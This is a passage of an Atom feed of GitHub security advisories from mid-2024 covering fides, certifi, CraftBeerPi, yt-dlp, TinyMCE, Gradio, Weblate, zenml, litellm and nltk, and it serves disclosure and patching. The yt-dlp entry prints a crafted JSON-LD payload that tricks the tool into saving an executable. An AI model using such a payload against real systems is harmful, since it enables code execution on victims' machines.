<li><a href="https://github.com/ethyca/fides/security/advisories/GHSA-53q7-4874-24qg">https://github.com/ethyca/fides/security/advisories/GHSA-53q7-4874-24qg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31223">https://nvd.nist.gov/vuln/detail/CVE-2024-31223</a></li>
<li><a href="https://github.com/ethyca/fides/commit/0555080541f18a5aacff452c590ac9a1b56d7097">https://github.com/ethyca/fides/commit/0555080541f18a5aacff452c590ac9a1b56d7097</a></li>
<li><a href="https://github.com/ethyca/fides/commit/cd510216b281de5443ec1c126add95cc5be0970a">https://github.com/ethyca/fides/commit/cd510216b281de5443ec1c126add95cc5be0970a</a></li>
<li><a href="https://github.com/advisories/GHSA-53q7-4874-24qg">https://github.com/advisories/GHSA-53q7-4874-24qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53q7-4874-24qg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T20:40:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[certifi] Certifi removes GLOBALTRUST root certificate]]></title>
        <id>https://github.com/advisories/GHSA-248v-346w-9cwc</id>
        <link href="https://github.com/advisories/GHSA-248v-346w-9cwc"/>
        <updated>2024-07-08T15:38:32.000Z</updated>
        <content type="html"><![CDATA[<p>Certifi 2024.07.04 removes root certificates from "GLOBALTRUST" from the root store. These are in the process of being removed from Mozilla's trust store.</p>
<p>GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified "long-running and unresolved compliance issues". Conclusions of Mozilla's investigation can be found <a href="https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI">here</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc">https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc</a></li>
<li><a href="https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463">https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39689">https://nvd.nist.gov/vuln/detail/CVE-2024-39689</a></li>
<li><a href="https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI">https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI</a></li>
<li><a href="https://github.com/advisories/GHSA-248v-346w-9cwc">https://github.com/advisories/GHSA-248v-346w-9cwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-248v-346w-9cwc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-05T20:06:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cbpi4] CraftBeerPi 4 allows arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-4f92-w438-f484</id>
        <link href="https://github.com/advisories/GHSA-4f92-w438-f484"/>
        <updated>2024-07-05T20:04:19.000Z</updated>
        <content type="html"><![CDATA[<p>URL GET parameter "logtime" utilized within the "downloadlog" function from "cbpi/http_endpoints/http_system.py" is subsequently passed to the "os.system" function in "cbpi/controller/system_controller.py" without prior validation allowing arbitrary code execution. This issue affects CraftBeerPi 4: from 4.0.0.58 (commit 563fae9) before 4.4.1.a1 (commit 57572c7).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3955">https://nvd.nist.gov/vuln/detail/CVE-2024-3955</a></li>
<li><a href="https://github.com/PiBrewing/craftbeerpi4/issues/132">https://github.com/PiBrewing/craftbeerpi4/issues/132</a></li>
<li><a href="https://cert.pl/en/posts/2024/05/CVE-2024-3955">https://cert.pl/en/posts/2024/05/CVE-2024-3955</a></li>
<li><a href="https://cert.pl/posts/2024/05/CVE-2024-3955">https://cert.pl/posts/2024/05/CVE-2024-3955</a></li>
<li><a href="https://github.com/advisories/GHSA-4f92-w438-f484">https://github.com/advisories/GHSA-4f92-w438-f484</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4f92-w438-f484</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-02T12:30:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ethyca-fides] Inclusion of Untrusted polyfill.io Code Vulnerability in fides.js]]></title>
        <id>https://github.com/advisories/GHSA-cvw4-c69g-7v7m</id>
        <link href="https://github.com/advisories/GHSA-cvw4-c69g-7v7m"/>
        <updated>2024-07-05T21:27:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="note">Note</h3>
<p>On Thursday, June 27, 2024, Cloudflare and Namecheap intervened at a domain level to ensure <code>polyfill.io</code> and its subdomains could not resolve to the compromised service, rendering this vulnerability <strong>unexploitable</strong>.</p>
<p>The following sections describe this vulnerability prior to the domain level intervention, when it was still exploitable.</p>
<h3 id="impact">Impact</h3>
<p><code>fides.js</code>, a client-side script used to interact with the consent management features of Fides, used the <code>polyfill.io</code> domain in a very limited edge case, when it detected a legacy browser such as IE11 that did not support the fetch standard.</p>
<p>On June 25th, 2024, Sansec published the following regarding the <code>polyfill.io</code> domain.</p>
<blockquote>
<p>The polyfill.js is a popular open source library to support older browsers. 100K+ sites embed it using the cdn.polyfill.io domain... However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting malware on mobile devices via any site that embeds cdn.polyfill.io.</p>
</blockquote>
<p>Therefore it was possible for users of legacy, pre-2017 browsers who navigate to a page serving <code>fides.js</code> to download and execute malicious scripts from the compromised domain.</p>
<p>No exploitation of <code>fides.js</code> via <code>polyfill.io</code> has been identified at this time, but other script developers who use <code>https://cdn.polyfill.io/v2/polyfill.min.js</code> have reported redirects to malicious websites.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in Fides version <code>2.39.1</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Prior to the domain level intervention, there were no server-side workarounds and the confidentiality, integrity, and availability impacts of this vulnerability were high. </p>
<p>Clients could ensure they were not affected by using a modern browser that supported the fetch standard. caniuse.com/fetch estimates that 97.52% of browser users use a browser that supports the fetch standard.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></li>
<li><a href="https://github.com/ethyca/fides/pull/5026/">https://github.com/ethyca/fides/pull/5026/</a></li>
<li><a href="https://fetch.spec.whatwg.org/">https://fetch.spec.whatwg.org/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ethyca/fides/security/advisories/GHSA-cvw4-c69g-7v7m">https://github.com/ethyca/fides/security/advisories/GHSA-cvw4-c69g-7v7m</a></li>
<li><a href="https://github.com/ethyca/fides/pull/5026">https://github.com/ethyca/fides/pull/5026</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38537">https://nvd.nist.gov/vuln/detail/CVE-2024-38537</a></li>
<li><a href="https://github.com/ethyca/fides/commit/868c4d629760572192bd61db34f5a4458ed12005">https://github.com/ethyca/fides/commit/868c4d629760572192bd61db34f5a4458ed12005</a></li>
<li><a href="https://fetch.spec.whatwg.org">https://fetch.spec.whatwg.org</a></li>
<li><a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></li>
<li><a href="https://github.com/advisories/GHSA-cvw4-c69g-7v7m">https://github.com/advisories/GHSA-cvw4-c69g-7v7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvw4-c69g-7v7m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-02T21:20:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp File system modification and RCE through improper file-extension sanitization]]></title>
        <id>https://github.com/advisories/GHSA-79w7-vh3h-8g4j</id>
        <link href="https://github.com/advisories/GHSA-79w7-vh3h-8g4j"/>
        <updated>2024-07-05T17:54:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>yt-dlp</code> does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows). Since <code>yt-dlp</code> also reads config from the working directory (and on Windows executables will be executed from the yt-dlp directory) this could lead to arbitrary code being executed.</p>
<h3 id="patches">Patches</h3>
<p><code>yt-dlp</code> version 2024.07.01 fixes this issue by whitelisting the allowed extensions.
This means some very uncommon extensions might not get downloaded; however, it will also limit the possible exploitation surface.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade yt-dlp to version 2024.07.01 as soon as possible, <strong>always</strong> have <code>.%(ext)s</code> at the end of the output template, and make sure you trust the websites that you are downloading from. Also, make sure to never download to a directory within PATH or other sensitive locations like your user directory, <code>system32</code>, or other binaries locations.</p>
<p>For users not able to upgrade:</p>
<ul>
<li>Make sure the extension of the media to download is a common video/audio/sub/... one</li>
<li>Try to avoid the generic extractor (<code>--ies default,-generic</code>)</li>
<li>Keep the default output template (<code>-o "%(title)s [%(id)s].%(ext)s</code>)</li>
<li>Omit any of the subtitle options (<code>--write-subs</code>, <code>--write-auto-subs</code>, <code>--all-subs</code>, <code>--write-srt</code>)</li>
<li>Use <code>--ignore-config --config-location ...</code> to not load config from common locations</li>
</ul>
<h3 id="details">Details</h3>
<p>One potential exploitation might look like this:</p>
<p>From a mimetype we do not know, we default to trimming the leading bit and using the remainder. Given a webpage that contains</p>
<pre><code class="language-html">&lt;script type="application/ld+json"&gt;
{
    "@context": "https://schema.org",
    "@type": "VideoObject",
    "name": "ffmpeg",
    "encodingFormat": "video/exe",
    "contentUrl": "https://example.com/video.mp4"
}
&lt;/script&gt;
</code></pre>
<p>this will try and download a file called <code>ffmpeg.exe</code> (<code>-o "%(title)s.%(ext)s</code>).
<code>ffmpeg.exe</code> will be searched for in the current directory, and so upon the next run arbitrary code can be executed.</p>
<p>Alternatively, when engineering a file called <code>yt-dlp.conf</code> to be created, the config file could contain <code>--exec ...</code> and so would also execute arbitrary code.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>A big thanks to @JarLob for independently finding a new application of the same underlying issue.
More can be read about on the dedicated GitHub Security Lab disclosure here: <a href="https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp">Path traversal saving subtitles (GHSL-2024-090)</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38519">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01">https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a">https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp">https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a">https://github.com/yt-dlp/yt-dlp/commit/5ce582448ececb8d9c30c8c31f58330090ced03a</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01">https://github.com/yt-dlp/yt-dlp/releases/tag/2024.07.01</a></li>
<li><a href="https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq">https://github.com/dirkf/youtube-dl/security/advisories/GHSA-22fp-mf44-f2mq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38519">https://nvd.nist.gov/vuln/detail/CVE-2024-38519</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/pull/32830">https://github.com/ytdl-org/youtube-dl/pull/32830</a></li>
<li><a href="https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec">https://github.com/ytdl-org/youtube-dl/commit/d42a222ed541b96649396ef00e19552aef0f09ec</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl">https://securitylab.github.com/advisories/GHSL-2024-089_youtube-dl</a></li>
<li><a href="https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp">https://securitylab.github.com/advisories/GHSL-2024-090_yt-dlp</a></li>
<li><a href="https://github.com/advisories/GHSA-79w7-vh3h-8g4j">https://github.com/advisories/GHSA-79w7-vh3h-8g4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79w7-vh3h-8g4j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-02T15:58:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using noscript elements]]></title>
        <id>https://github.com/advisories/GHSA-w9jx-4g6g-rp7x</id>
        <link href="https://github.com/advisories/GHSA-w9jx-4g6g-rp7x"/>
        <updated>2024-07-02T02:41:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A <a href="https://owasp.org/www-community/attacks/xss/">cross-site scripting (XSS)</a> vulnerability was discovered in TinyMCE’s content parsing code. This allowed specially crafted noscript elements containing malicious code to be executed when that content was loaded into the editor.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in TinyMCE 7.2.0, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that content within noscript elements are properly parsed.</p>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<ul>
<li>Upgrade to TinyMCE 7.2.0 or higher.</li>
<li>Upgrade to TinyMCE 6.8.4 or higher for TinyMCE 6.x.</li>
<li>Upgrade to TinyMCE 5.11.0 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</li>
</ul>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny thanks <a href="https://malavkhatri.com/">Malav Khatri</a> and another reporter for their help identifying this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview">TinyMCE 6.8.4</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview">TinyMCE 7.2.0</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:infosec@tiny.cloud">infosec@tiny.cloud</a></li>
<li>Open an issue in the <a href="https://github.com/tinymce/tinymce/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc">TinyMCE repo</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-w9jx-4g6g-rp7x">https://github.com/tinymce/tinymce/security/advisories/GHSA-w9jx-4g6g-rp7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38357">https://nvd.nist.gov/vuln/detail/CVE-2024-38357</a></li>
<li><a href="https://github.com/tinymce/tinymce/commit/5acb741665a98e83d62b91713c800abbff43b00d">https://github.com/tinymce/tinymce/commit/5acb741665a98e83d62b91713c800abbff43b00d</a></li>
<li><a href="https://github.com/tinymce/tinymce/commit/a9fb858509f86dacfa8b01cfd34653b408983ac0">https://github.com/tinymce/tinymce/commit/a9fb858509f86dacfa8b01cfd34653b408983ac0</a></li>
<li><a href="https://owasp.org/www-community/attacks/xss">https://owasp.org/www-community/attacks/xss</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview</a></li>
<li><a href="https://github.com/advisories/GHSA-w9jx-4g6g-rp7x">https://github.com/advisories/GHSA-w9jx-4g6g-rp7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9jx-4g6g-rp7x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-19T15:07:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using noneditable_regexp option]]></title>
        <id>https://github.com/advisories/GHSA-9hcv-j9pv-qmph</id>
        <link href="https://github.com/advisories/GHSA-9hcv-j9pv-qmph"/>
        <updated>2024-07-02T02:39:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A <a href="https://owasp.org/www-community/attacks/xss/">cross-site scripting (XSS)</a> vulnerability was discovered in TinyMCE’s content extraction code. When using the <code>noneditable_regexp</code> option, specially crafted HTML attributes containing malicious code were able to be executed when content was extracted from the editor.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability has been patched in TinyMCE 7.2.0, TinyMCE 6.8.4 and TinyMCE 5.11.0 LTS by ensuring that, when using the <code>noneditable_regexp</code> option, any content within an attribute is properly verified to match the configured regular expression before being added.</p>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<ul>
<li>Upgrade to TinyMCE 7.2.0 or higher.</li>
<li>Upgrade to TinyMCE 6.8.4 or higher for TinyMCE 6.x.</li>
<li>Upgrade to TinyMCE 5.11.0 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview">TinyMCE 6.8.4</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview">TinyMCE 7.2.0</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:infosec@tiny.cloud">infosec@tiny.cloud</a></li>
<li>Open an issue in the <a href="https://github.com/tinymce/tinymce/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc">TinyMCE repo</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-9hcv-j9pv-qmph">https://github.com/tinymce/tinymce/security/advisories/GHSA-9hcv-j9pv-qmph</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/6/6.8.4-release-notes/#overview</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/latest/7.2-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/latest/7.2-release-notes/#overview</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38356">https://nvd.nist.gov/vuln/detail/CVE-2024-38356</a></li>
<li><a href="https://github.com/tinymce/tinymce/commit/5acb741665a98e83d62b91713c800abbff43b00d">https://github.com/tinymce/tinymce/commit/5acb741665a98e83d62b91713c800abbff43b00d</a></li>
<li><a href="https://github.com/tinymce/tinymce/commit/a9fb858509f86dacfa8b01cfd34653b408983ac0">https://github.com/tinymce/tinymce/commit/a9fb858509f86dacfa8b01cfd34653b408983ac0</a></li>
<li><a href="https://owasp.org/www-community/attacks/xss">https://owasp.org/www-community/attacks/xss</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.2-release-notes/#overview</a></li>
<li><a href="https://github.com/advisories/GHSA-9hcv-j9pv-qmph">https://github.com/advisories/GHSA-9hcv-j9pv-qmph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hcv-j9pv-qmph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-19T15:07:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Gradio] Gradio was discovered to contain a code injection vulnerability via the component /gradio/component_meta.py]]></title>
        <id>https://github.com/advisories/GHSA-9v2f-6vcg-3hgv</id>
        <link href="https://github.com/advisories/GHSA-9v2f-6vcg-3hgv"/>
        <updated>2024-07-03T20:05:22.000Z</updated>
        <content type="html"><![CDATA[<p>Gradio v4.36.1 was discovered to contain a code injection vulnerability via the component /gradio/component_meta.py. This vulnerability is triggered via a crafted input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39236">https://nvd.nist.gov/vuln/detail/CVE-2024-39236</a></li>
<li><a href="https://github.com/Aaron911/PoC/blob/main/Gradio.md">https://github.com/Aaron911/PoC/blob/main/Gradio.md</a></li>
<li><a href="https://github.com/advisories/GHSA-9v2f-6vcg-3hgv">https://github.com/advisories/GHSA-9v2f-6vcg-3hgv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9v2f-6vcg-3hgv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-01T21:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Weblate] Weblate vulnerable to improper sanitization of project backups]]></title>
        <id>https://github.com/advisories/GHSA-jfgp-674x-6q4p</id>
        <link href="https://github.com/advisories/GHSA-jfgp-674x-6q4p"/>
        <updated>2024-07-02T02:32:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Weblate didn't correctly validate filenames when restoring project backup. It may be possible to gain unauthorized access to
files on the server using a crafted ZIP file.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in Weblate 5.6.2 via <a href="https://github.com/WeblateOrg/weblate/commit/b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd">https://github.com/WeblateOrg/weblate/commit/b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not allow project creation to untrusted users.</p>
<h3 id="references">References</h3>
<p>Thanks to Bryan Cahill for bringing this issue to our attention.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open a topic in <a href="https://github.com/WeblateOrg/weblate/discussions">discussions</a></li>
<li>Email us at <a href="mailto:care@weblate.org">care@weblate.org</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/WeblateOrg/weblate/security/advisories/GHSA-jfgp-674x-6q4p">https://github.com/WeblateOrg/weblate/security/advisories/GHSA-jfgp-674x-6q4p</a></li>
<li><a href="https://github.com/WeblateOrg/weblate/commit/b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd">https://github.com/WeblateOrg/weblate/commit/b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39303">https://nvd.nist.gov/vuln/detail/CVE-2024-39303</a></li>
<li><a href="https://github.com/advisories/GHSA-jfgp-674x-6q4p">https://github.com/advisories/GHSA-jfgp-674x-6q4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfgp-674x-6q4p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-01T21:02:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Reflected Cross-Site Scripting (XSS) in zenml]]></title>
        <id>https://github.com/advisories/GHSA-3434-hc3m-8mmm</id>
        <link href="https://github.com/advisories/GHSA-3434-hc3m-8mmm"/>
        <updated>2024-07-01T18:34:50.000Z</updated>
        <content type="html"><![CDATA[<p>A reflected Cross-Site Scripting (XSS) vulnerability was identified in zenml-io/zenml version 0.57.1. The vulnerability exists due to improper neutralization of input during web page generation, specifically within the survey redirect parameter. This flaw allows an attacker to redirect users to a specified URL after completing a survey, without proper validation of the 'redirect' parameter. Consequently, an attacker can execute arbitrary JavaScript code in the context of the user's browser session. This vulnerability could be exploited to steal cookies, potentially leading to account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5062">https://nvd.nist.gov/vuln/detail/CVE-2024-5062</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/21edd863c0ba53c1110b6f018a07c2d6853cf6d4">https://github.com/zenml-io/zenml/commit/21edd863c0ba53c1110b6f018a07c2d6853cf6d4</a></li>
<li><a href="https://huntr.com/bounties/ceddd3c1-a9da-4d6c-85c4-41d4d1e1102f">https://huntr.com/bounties/ceddd3c1-a9da-4d6c-85c4-41d4d1e1102f</a></li>
<li><a href="https://github.com/advisories/GHSA-3434-hc3m-8mmm">https://github.com/advisories/GHSA-3434-hc3m-8mmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3434-hc3m-8mmm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-30T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] litellm vulnerable to improper access control in team management]]></title>
        <id>https://github.com/advisories/GHSA-qqcv-vg9f-5rr3</id>
        <link href="https://github.com/advisories/GHSA-qqcv-vg9f-5rr3"/>
        <updated>2024-07-05T18:09:05.000Z</updated>
        <content type="html"><![CDATA[<p>berriai/litellm version 1.34.34 is vulnerable to improper access control in its team management functionality. This vulnerability allows attackers to perform unauthorized actions such as creating, updating, viewing, deleting, blocking, and unblocking any teams, as well as adding or deleting any member to or from any teams. The vulnerability stems from insufficient access control checks in various team management endpoints, enabling attackers to exploit these functionalities without proper authorization.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5710">https://nvd.nist.gov/vuln/detail/CVE-2024-5710</a></li>
<li><a href="https://huntr.com/bounties/70897f59-a966-4d93-b71e-745e3da91970">https://huntr.com/bounties/70897f59-a966-4d93-b71e-745e3da91970</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/da3ae00bd68f451ed8ddf0bc0a9fd34bde5554d6">https://github.com/BerriAI/litellm/commit/da3ae00bd68f451ed8ddf0bc0a9fd34bde5554d6</a></li>
<li><a href="https://github.com/BerriAI/litellm/blob/224148d6133ee50801cb129cbd21ccc213992e25/litellm/proxy/auth/user_api_key_auth.py#L1020">https://github.com/BerriAI/litellm/blob/224148d6133ee50801cb129cbd21ccc213992e25/litellm/proxy/auth/user_api_key_auth.py#L1020</a></li>
<li><a href="https://github.com/advisories/GHSA-qqcv-vg9f-5rr3">https://github.com/advisories/GHSA-qqcv-vg9f-5rr3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qqcv-vg9f-5rr3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-27T21:32:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nltk] ntlk unsafe deserialization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cgvx-9447-vcch</id>
        <link href="https://github.com/advisories/GHSA-cgvx-9447-vcch"/>
        <updated>2024-07-05T17:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>NLTK through 3.8.1 allows remote code execution if untrusted packages have pickled Python code, and the integrated data package download functionality is used. This affects, for example, averaged_perceptron_tagger and punkt.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39705">https://nvd.nist.gov/vuln/detail/CVE-2024-39705</a></li>
<li><a href="https://github.com/nltk/nltk/issues/2522">https://github.com/nltk/nltk/issues/2522</a></li>
<li><a href="https://github.com/nltk/nltk/issues/3266">https://github.com/nltk/nltk/issues/3266</a></li>
<li><a href="https://github.com/advisories/GHSA-cgvx-9447-vcch">https://github.com/advisories/GHSA-cgvx-9447-vcch</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgvx-9447-vcch</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-28T00:33:31.000Z</published>
    </entry>
</feed>